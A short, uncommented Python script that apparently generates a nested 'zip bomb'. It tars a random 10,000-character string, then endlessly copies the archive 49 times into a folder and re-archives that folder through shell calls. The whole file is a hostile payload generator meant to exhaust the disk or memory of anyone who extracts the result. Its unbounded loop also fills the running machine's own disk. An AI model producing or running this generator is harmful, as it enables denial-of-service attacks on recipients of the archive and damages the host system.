import os
import string
import random
i = 0
rndstr = ""
while not i == 10000:
  i += 1
  os.system("clear")
  rndstr = rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase)) - 1]
  print("Generating Random String...")
  print(str(i) + "/10000")
os.system("echo " + rndstr + " > rndstr.txt")
os.system("clear")
os.system('tar -zcvf zbomb1.tar.gz rndstr.txt')
while True:
  os.system('mkdir zbomb')
  os.system('cp zbomb1.tar.gz zbomb/zbomb1.tar.gz')
  i = 1
  while not i == 49:
    i += 1
    os.system("cd zbomb && cp zbomb1.tar.gz zbomb" + str(i) + ".tar.gz")
  os.system("tar -zcvf zbomb1.tar.gz zbomb")
